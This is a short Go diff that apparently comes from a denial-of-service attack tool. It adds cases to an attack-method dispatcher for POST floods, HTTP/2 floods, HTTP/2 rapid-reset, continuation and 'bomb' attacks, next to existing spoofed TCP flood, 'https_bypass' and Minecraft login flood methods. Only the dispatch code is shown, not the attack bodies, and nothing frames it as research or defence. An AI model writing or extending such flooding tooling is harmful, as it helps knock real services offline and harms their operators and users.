@@ -174,6 +174,16 @@ func subAttackMethodToFunc(cfg AttackConfig) *AttackSession {
 		return StartSpoofedTCPFloodEx(cfg)
 	case "http_flood":
 		return StartHTTPFloodEx(cfg)
+	case "post_flood":
+		return StartPOSTFloodEx(cfg)
+	case "http2_flood":
+		return StartHTTP2FloodEx(cfg)
+	case "http2_reset":
+		return StartHTTP2ResetEx(cfg)
+	case "http2_continuation":
+		return StartHTTP2ContinuationEx(cfg)
+	case "http2_bomb":
+		return StartHTTP2BombEx(cfg)
 	case "https_bypass":
 		return StartHTTPSBypassEx(cfg)
 	case "minecraft_handshake", "minecraft_login":
